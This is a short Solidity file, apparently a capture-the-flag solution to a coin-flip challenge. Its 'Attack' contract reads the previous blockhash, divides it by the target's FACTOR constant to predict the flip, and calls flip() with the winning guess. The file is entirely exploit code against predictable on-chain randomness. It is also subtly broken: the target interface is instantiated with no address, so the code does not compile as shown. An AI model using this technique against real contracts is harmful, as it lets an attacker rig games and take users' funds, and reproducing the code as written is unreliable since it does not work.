// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface Instance {
    
    function flip(bool) external returns (bool);
}

contract Attack {
    
    Instance instance = Instance();
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    uint256 blockValue;
    uint256 lastHash;

    function attack() public {
        
        blockValue = uint256(blockhash(block.number - 1));
        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coin = blockValue / FACTOR;

        if(coin == 1)
            instance.flip(true);
        else
            instance.flip(false);
    }
}